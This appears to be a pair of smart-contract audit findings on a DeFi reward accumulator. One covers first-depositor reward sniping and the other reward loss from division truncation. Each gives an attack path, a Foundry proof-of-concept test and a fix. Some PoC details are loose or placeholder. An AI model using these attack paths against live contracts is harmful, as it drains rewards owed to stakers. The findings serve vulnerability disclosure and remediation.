# M-1 First depositor will capture accrued rewards for stakers

## Summary

The reward distribution logic in `RewardAccumulator._rewardPerToken()`
allows the first depositor to capture a disproportionate share of
rewards if `totalCollateral` is very low when rewards begin accruing.
This creates a "reward sniping" vector where a dust deposit drains
nearly all emissions (attacker deposits dust and later triggers an
update).


## Root Cause

In
`RewardAccumulator._updateReward(address market, address account, uint256 collateralBalance, uint256 totalCollateral)`
#156 the implementation skips the per-token update entirely when
`totalCollateral == 0`.

i.e. current code:

    if (totalCollateral != 0) { 
        /* update rewardPerTokenStored, lastUpdateTime, rewards[...] */ 
    } 
    // otherwise do nothing

`RewardAccumulator._rewardPerToken(address market, IERC20 _rewardToken, uint256 totalCollateral)`
#116 computes:

    rewardPerTokenStored + 
    (((_lastTimeRewardApplicable(periodFinish) - lastUpdateTime) 
    * rewardRate * 1e18) / totalCollateral)

which divides the whole elapsed emission period by the current
`totalCollateral`. If `totalCollateral` is tiny at the time of the first
update, the delta is massively amplified.

`RewardAccumulator.processRewards(...)` / `_processRewards(...)` #429
are the functions that set `rewardRate` and `periodFinish`. Market flows
(via `MarketCore` / `MarketExternalActions`) call
`rewardAccumulator.updateRewards(...)` #146 through the `updateRewards`
modifier before deposit/withdraw. Because `_updateReward` does nothing
when `totalCollateral == 0`, time elapsed while the market was empty is
kept in `lastUpdateTime` semantics and later retroactively applied when
`totalCollateral` becomes non-zero.

### Example flow with values:

-   A reward stream is started with `rewardRate = 100 tokens/s`.
-   Market is empty (`totalCollateral = 0`) for 1 hour
    (`Δt = 3600 seconds`).
-   During this time, `100 * 3600 = 360,000 tokens` are emitted but not
    assigned (since `_updateReward` is a no-op).
-   Attacker deposits `1 wei` collateral (dust).
-   On next update, `_rewardPerToken` computes:

```solidity
    deltaRewardPerToken = (3600 * 100 * 1e18) / 1 ≈ 3.6e23
```

-   Attacker's balance = 1 → earned ≈ 360,000 tokens credited
    immediately.
-   Attacker claims via `claimSimple()` and drains all emissions that
    should have been distributed fairly to future stakers.

### Note on addNewRewards

While `RewardAccumulator.addNewRewards` #379 sets `lastUpdateTime` when
registering a reward token, it does not address the vulnerability. If
rewards are registered before emissions actually start, the stale
`lastUpdateTime` can enlarge the retroactive window, worsening the
sniping effect. Therefore, `addNewRewards` does not mitigate this issue
and the fix in `_updateReward` remains required.


## Affected Code Link

-   https://github.com/sherlock-audit/2025-08-usg-tangent/blob/main/tangent-contracts/src/USG/Utilities/RewardAccumulator.sol#L116C3-L127C1\
-   https://github.com/sherlock-audit/2025-08-usg-tangent/blob/main/tangent-contracts/src/USG/Utilities/RewardAccumulator.sol#L156C1-L177C1\
-   https://github.com/sherlock-audit/2025-08-usg-tangent/blob/main/tangent-contracts/src/USG/Utilities/RewardAccumulator.sol#L429C1-L465C1


## Internal Pre-conditions

-   A reward stream for the market exists (i.e., `rewardRate > 0` and
    `periodFinish > now`) --- rewards have been notified via
    `processRewards` or similar.
-   At the moment the reward stream started (or during an emission
    period), `totalCollateral == 0` (market empty).
-   `_updateReward` is not called (or is a no-op) while the market is
    empty (current code behavior).
-   Later, an attacker (or benign user) deposits a very small amount,
    making `totalCollateral > 0` but still tiny.
-   A subsequent action triggers `rewardAccumulator.updateRewards(...)` while `totalCollateral` is small, causing `_rewardPerToken` to
    compute a large delta divided by tiny `totalCollateral`.

## External Pre-conditions

-   Emissions are funded / notified (`processRewards` or
    `processMultiRewards` called).
-   No external minimum-liquidity guard or bootstrap period prevents
    starting rewards on empty markets.
-   Miner/MEV capability is not required but can trivially amplify
    outcome.


## Attack Path

1.  Operator/Treasury calls `RewardAccumulator.processRewards(...)`.
2.  Market is empty: `ICollateral(market).totalCollateral() == 0`.
3.  `processRewards` calls `_updateReward(...)` which is a no-op because
    `totalCollateral == 0`.
4.  `_processRewards` sets `rewardRate`, `lastUpdateTime`, and
    `periodFinish`.
5.  Time passes while no users deposit --- emissions accrue but are
    unassigned.
6.  Attacker deposits dust via `MarketExternalActions.deposit(...)`.
7.  First deposit: `updateRewards` runs with `totalCollateral == 0` → no
    update.
8.  Second action triggers `updateRewards` with `totalCollateral > 0`
    but tiny.
9.  `_updateReward` computes:


```solidity
    deltaRewardPerToken = 
    (_lastTimeRewardApplicable(periodFinish) - lastUpdateTime) 
    * rewardRate * 1e18 / totalCollateral

```

10. Attacker receives majority (or all) accrued emissions.
11. Attacker calls `claimSimple()` / `claimMultiple()` and withdraws
    rewards.

**Net effect:** emissions produced while the market was empty are
retroactively allocated to the first small-stake depositor.


## Impact

-   **Affected:** market stakers and protocol (incentive budget).
-   **Effect:** emissions streamed during empty-market period can be
    drained by a dust depositor.
-   **Severity:** Medium - trivial exploit, systemic across markets,
    MEV-friendly, repeated exploitation drains rewards and compromises
    LP bootstrapping.
-   **Quantification example:** if rewards produce R tokens over interval Δt while market empty, then a dust deposit and later update can credit nearly R tokens to the dust depositor instead of distributing over future stakers. This is a complete capture of intended emissions — not merely fractional misallocation.


## PoC

Create `RewardAccumulator_RewardSniping_PoC.t.sol` file in test folder
and paste the following code:

```solidity

// SPDX-License-Identifier: MIT  
pragma solidity ^0.8.13;  
  
  
import "forge-std/Test.sol";  
  
/// IMPORTANT: adjust the path if it is in a different folder  
import "./MarketDeploymentContext.sol";  
  
/// PoC test: demonstrates that starting a reward stream while a market is empty  
/// allows the first depositor (dust) to capture previously-accrued emissions.  
contract RewardAccumulator_RewardSniping_PoC is MarketDeploymentContext, Test {  
    /// Basic scenario constants  
    uint256 constant ONE_TOKEN = 1e18;  
    uint256 constant HOUR = 3600;  
  
    function setUp() public {  
        // MarketDeploymentContext constructor already set up maps and test addresses.  
        // Nothing else to do here — helpers are used in test directly.  
    }  
  
    function test_first_depositor_snipes_emissions() public {  
        // --- 1) Deploy a Convex Curve LP market that has reward tokens registered  
        IERC20Metadata collat = AddrCurveStableLP.USDC_crvUSD;   
        ConvexCrvLPMarket market = deployConvexCurveLPMarket(collat, true); // isConvexLinked = true  
  
        // Ensure market starts empty  
        assertEq(market.totalCollateral(), 0, "market should start empty");  
  
        // --- 2) Choose a reward token that was added by deploy helper (Convex markets add CRV & CVX)  
        IERC20 rewardToken = AddrClassicERC20.CRV;  
  
        // --- 3) Fund the market with a reward amount equal to (REWARD_DURATION * 1 token)  
        // Using 7 days as rewards duration (same constant used in upstream contract)  
        uint256 rewardsDuration = 7 days;  
        uint256 rewardAmount = rewardsDuration * ONE_TOKEN; // sets rewardRate == 1 token / second  
  
        // Mint/assign reward tokens into the market so claimUnderlyingRewards will "find" them.  
        // Foundry cheat: deal sets ERC20 balance for an address in tests.  
        deal(address(rewardToken), address(market), rewardAmount);  
  
        // --- 4) Start the reward stream while market is empty  
        // processRewards will call market.claimUnderlyingRewards(...) (rewardAccumulator is msg.sender there)  
        vm.prank(owner);  
        rewardAccumulator.processRewards(address(market), owner);  
  
        // After processRewards, stream is active and rewardRate = rewardAmount / rewardsDuration = 1 token/s  
  
        // --- 5) Let time pass while market is empty so emissions accrue with no stakers  
        vm.warp(block.timestamp + 1 hours); // Δt = 3600 seconds -> 3600 tokens intended  
  
        // --- 6) Attacker (usr1) deposits dust (1 token) — first deposit, updateRewards runs BEFORE transfer  
        vm.startPrank(usr1);  
        IERC20(collat).approve(address(market), 2 * ONE_TOKEN);  
  
        // first deposit: updateRewards(_for) runs with collateralBalances[_for]=0 and totalCollateral=0 -> no per-token update  
        market.deposit(usr1, ONE_TOKEN);  
  
        // second deposit: updateRewards(_for) now runs with collateralBalances[usr1]=ONE_TOKEN and totalCollateral=ONE_TOKEN  
        // this triggers RewardAccumulator._updateReward(...) with totalCollateral > 0 and causes the retroactive allocation  
        market.deposit(usr1, ONE_TOKEN);  
        vm.stopPrank();  
  
        // --- 7) Inspect the reward credited to the attacker in the accumulator ledger  
        // rewardAccumulator.rewards(market, account, token) should exist (public nested mapping)  
        uint256 attackerAssigned = rewardAccumulator.rewards(address(market), usr1, rewardToken);  
  
        // Expected tokens (wei) accumulated during the empty period (elapsed seconds * 1 token/s)  
        uint256 expected = HOUR * ONE_TOKEN; // 3600 * 1e18  
  
        emit log_named_uint("expected tokens (wei) emitted while pool empty", expected);  
        emit log_named_uint("attacker assigned (wei) in reward ledger", attackerAssigned);  
  
        // The attacker should receive almost all emitted tokens for that empty interval.  
        // Allow some leeway (e.g., >= 90%) in case of truncation math; adjust if necessary for your exact impl.  
        assertTrue(attackerAssigned >= (expected * 9) / 10, "attacker did not capture expected majority of empty-period emissions");  
    }  
}  
```


## Mitigation

### Primary Fix (Recommended)

Modify `RewardAccumulator._updateReward(...)` so that when
`totalCollateral == 0` it advances `lastUpdateTime` to the current
applicable time instead of skipping.

``` solidity
if (totalCollateral == 0) {  
    for each token in rewardTokens[market] {  
        rewardData[market][token].lastUpdateTime = 
            _lastTimeRewardApplicable(rewardData[market][token].periodFinish);  
    }  
    return;  
}
```

This prevents retroactive allocation of empty-market emissions.


### Secondary / Defense-in-Depth Options

-   Disallow `processRewards` when market empty.
-   Require minimum liquidity threshold before starting emissions.
-   Introduce bootstrap grace period before rewards begin accruing.


# S-2 RewardAccumulator: Integer-division remainder in \_updateReward causes systematic loss of reward tokens

## Summary

RewardAccumulator :: \_updateReward() integer-division remainder will
cause systematic loss of reward tokens for stakers as the contract will
truncate fractional reward allocations on each update while the
underlying protocol emits whole tokens (via processRewards), and an
attacker or keeper can combine this bookkeeping mismatch with
harvest/fee flows to extract value.


## Root Cause

In RewardAccumulator.sol : 160 - 170 the per-update reward-per-token
calculation uses integer division and drops the remainder, and that
remainder is never stored or carried forward. Concretely:

In `RewardAccumulator._rewardPerToken(...)` the delta Δt is computed as:

    (((_lastTimeRewardApplicable(rewardData[market][_rewardToken].periodFinish) - 
    rewardData[market][_rewardToken].lastUpdateTime) *  
    rewardData[market][_rewardToken].rewardRate *  
    1e18) / totalCollateral);

which floors any fractional remainder;

In `_updateReward(...)` the code writes:

    rewardData[market][token].rewardPerTokenStored = _rewardPerToken(...);  
    rewardData[market][token].lastUpdateTime = _lastTimeRewardApplicable(...);  
      
    if (account != address(0)) {  
        rewards[market][account][token] = _earned(...);  
        userRewardPerTokenPaid[market][account][token] = rewardData[market][token].rewardPerTokenStored;  
    }

No variable stores the dropped:

    (Δt * rewardRate * 1e18) % totalCollateral

remainder --- it is lost from the ledger.

The user accrual formula `_earned(...)` also truncates:

    (_balance * (rewardPerTokenNew - userPaid)) / 1e18 + rewards[...];

So per-user amounts are further floored.

Because `processRewards(...)` claims real tokens from underlying
protocols (Convex/Curve/Pendle) and the bookkeeping
(`rewardPerTokenStored`, `rewardRate`, `lastUpdateTime`)
under-allocates, physical tokens claimed \> ledgered entitlements; those
"lost" tokens accumulate away from user balances.


## Affected Code

RewardAccumulator.sol : #160 - 170

Link for affected code:\
https://github.com/sherlock-audit/2025-08-usg-tangent/blob/main/tangent-contracts/src/USG/Utilities/RewardAccumulator.sol#L160C6-L170C1


## Internal Pre-conditions

-   Market uses RewardAccumulator and has `totalCollateral > 0`.
-   `rewardRate > 0` for at least one reward token in
    `rewardTokens[market]`.
-   `processRewards(market, harvestFeeReceiver)` is callable (public)
    and executed periodically.
-   Many updates occur over time (`Δt > 0` for repeated updates).


## External Pre-conditions

-   The market receives/claims real reward tokens from the underlying
    protocol via `IMarketExternalActions.claimUnderlyingRewards(...)`.
-   (Optional) Harvest fee flows are non-zero and caller can be
    `harvestFeeReceiver`.


## Attack Path

1.  Normal operation: `processRewards(market, someReceiver)` is called.
2.  `_updateReward(...)` computes:
```solidity
    deltaRewardPerToken = floor((Δt * rewardRate * 1e18) / totalCollateral)
```

and writes `rewardPerTokenStored` and `lastUpdateTime`; the remainder:
```solidity
    r = (Δt * rewardRate * 1e18) % totalCollateral
```
is discarded.

3.  `RewardAccumulator` calls
    `IMarketExternalActions(market).claimUnderlyingRewards(...)` which
    transfers physical tokens.
4.  Users' rewards are computed using floored bookkeeping values.
5.  Sum of ledgered user rewards + fees \< actual claimed tokens.
6.  Leftover tokens accumulate in the contract.
7.  Over repeated calls, discarded fragments accumulate into a material
    token balance.
8.  Optional amplification: repeated keeper calls combined with fee
    flows may allow partial value extraction.



## Impact

-   **Direct economic loss:** Rewards emitted are systematically
    under-distributed to stakers.
-   **Systemic invariant break:** Reward conservation violated.
-   **High severity:** Direct loss of funds and economic impact.
-   **Incentive distortion:** Trust erosion, potential MEV/keeper
    extraction.
-   **Long-term accumulation:** Lost rewards can exceed material USD
    thresholds.


## PoC

Place the following test contract in
`test/RewardAccumulatorTruncationIntegration.t.sol`:

``` solidity
  
// SPDX-License-Identifier: MIT  
pragma solidity ^0.8.13;  
  
import "forge-std/Test.sol";  
  
// (adjust import path to where MarketDeploymentContext.sol lives)  
import "./MarketDeploymentContext.sol";  
  
/// Integration PoC: demonstrates that physical tokens claimed via processRewards  
/// can be greater than the tokens ledgered to users due to truncation.  
  
contract RewardAccumulatorTruncationIntegration is MarketDeploymentContext, Test {  
     
    address usrA;  
    address usrB;  
    address ownerAddr;  
  
    function setUp() public {  
        //  adapt if different  
        ownerAddr = owner;  
        usrA = usr1;  
        usrB = usr2;  
  
        // Ensure time origin predictable  
        vm.warp(1_700_000_000); // arbitrary timestamp  
    }  
  
    /// Integration test  
    function test_reward_truncation_shows_bookkeeping_shortfall() public {  
        // --- 1) Deploy a market (ConvexCurve LP market) using your helpers  
          
        IERC20Metadata collat = AddrCurveStableLP.USDC_crvUSD; // adjust if different  
        ConvexCrvLPMarket market = deployConvexCurveLPMarket(collat, true);  
  
        // --- 2) Give collateral tokens to users  
        giveCollateralToUsers(collat);  
  
        // --- 3) Users approve + deposit a *small* amount so totalCollateral is small (makes remainders visible)  
        uint256 depositAmount = 7 * 1e18; // 7 tokens (choose small number)  
        vm.startPrank(usr1);  
        IERC20(collat).approve(address(market), depositAmount);  
        market.deposit(usr1, 2 * 1e18); // Alice deposits 2  
        vm.stopPrank();  
  
        vm.startPrank(usr2);  
        IERC20(collat).approve(address(market), depositAmount);  
        market.deposit(usr2, 5 * 1e18); // Bob deposits 5  
        vm.stopPrank();  
  
        uint256 totalCollateral = market.totalCollateral();  
        assertEq(totalCollateral, 7 * 1e18, "totalCollateral must be 7 tokens");  
  
        // --- 4) Add reward tokens to the market so claimUnderlyingRewards can claim them.  
          
        IERC20 rewardToken = AddrClassicERC20.CRV; // adjust token symbol if needed  
        uint256 rewardAmount = 5 * 1e18; // 5 tokens emitted this round (intentionally small)  
  
        // fund the market with reward token (pretend the underlying paid it out)  
        // Use Foundry cheat `deal` for ERC20 balances (works in many repos)  
        deal(address(rewardToken), address(market), rewardAmount);  
  
        // check pre-state: market has reward balance  
        uint256 marketRewardBalanceBefore = IERC20(rewardToken).balanceOf(address(market));  
        assertEq(marketRewardBalanceBefore, rewardAmount);  
  
        // Advance time so update will compute delta based on non-zero Δt  
        vm.warp(block.timestamp + 1);  
  
        // --- 5) Call processRewards on rewardAccumulator (the function under test)  
        // anyone can call it; choose owner or special account  
        vm.prank(ownerAddr);  
        rewardAccumulator.processRewards(address(market), ownerAddr);  
  
        // --- 6) Now compute book-keeping-based assigned tokens:  
        // We compute:  
        //   rewardPerTokenDelta = rewardPerTokenStored_after - rewardPerTokenStored_before  
        //   assigned_by_book = rewardPerTokenDelta * totalCollateral / 1e18  
        //  
        // We need to read rewardPerTokenStored before and after. For simplicity in this test,  
        // we re-read after and treat initial value as zero (fresh market). If your deployment already  
        // had non-zero rewardPerTokenStored, capture it before calling processRewards.  
        ( , , ) = ("", "", ""); // no-op to avoid warnings  
  
         
        uint256 rewardPerTokenAfter = rewardAccumulator.rewardData(address(market), rewardToken).rewardPerTokenStored;  
          
        // Because this is the first update in our test, we assume rewardPerTokenBefore == 0.  
        uint256 rewardPerTokenBefore = 0;  
  
        uint256 rewardPerTokenDelta = rewardPerTokenAfter - rewardPerTokenBefore;  
  
        // assigned_by_book = floor(rewardPerTokenDelta * totalCollateral / 1e18)  
        uint256 assignedByBook = (rewardPerTokenDelta * totalCollateral) / 1e18;  
  
        // --- 7) Observed claimed tokens: check how many tokens were physically moved out of the market  
        // Many implementations move tokens from market to the accumulator during _processRewards.  
        // We capture balances *after* processRewards on relevant addresses (market, rewardAccumulator, owner harvest collector)  
        uint256 marketBalanceAfter = IERC20(rewardToken).balanceOf(address(market));  
        uint256 accumulatorBalanceAfter = IERC20(rewardToken).balanceOf(address(rewardAccumulator));  
        uint256 ownerBalanceAfter = IERC20(rewardToken).balanceOf(ownerAddr);  
  
        uint256 totalClaimedObserved = rewardAmount - marketBalanceAfter + accumulatorBalanceAfter; // rough estimate  
        // (Depending on how _processRewards transfers tokens, you might instead sum accumulatorBalanceAfter + cutFeeForToken[rewardToken] + ownerBalanceAfter etc.)  
  
        emit log_named_uint("rewardAmount (funded to market)      =", rewardAmount);  
        emit log_named_uint("assignedByBook (computed from RPT)   =", assignedByBook);  
        emit log_named_uint("marketBalanceAfter                   =", marketBalanceAfter);  
        emit log_named_uint("accumulatorBalanceAfter              =", accumulatorBalanceAfter);  
        emit log_named_uint("ownerBalanceAfter (harvest receiver) =", ownerBalanceAfter);  
        emit log_named_uint("totalClaimedObserved (estimate)      =", totalClaimedObserved);  
  
        // Final assertion: totalClaimedObserved should be >= assignedByBook, and in practice for this scenario the  
        // equality will not hold because of truncation: totalClaimedObserved > assignedByBook  
        assertTrue(totalClaimedObserved >= assignedByBook, "Observed claimed < book (unexpected)");  
        assertTrue(totalClaimedObserved > assignedByBook, "No truncation gap detected - adjust numbers / accessor names");  
    }  
}  
```


## Mitigation

### Primary Fix - Carry Division Remainder Forward (Recommended)

Add storage to keep per-market/per-reward-token numerator remainder and
incorporate it into the next update.

-   Use a well-tested `mulDiv` (Uniswap `FullMath` or `PRBMath`) to
    compute `time * rewardRate * 1e18` safely and obtain quotient &
    remainder.
-   Do not rely on naive `a * b / c` which can overflow.
-   Keep `rewardNumeratorRemainder < totalCollateral`.
-   On next update, add remainder back into numerator so fractional
    pieces are eventually distributed.
-   Ensure reward conservation holds.
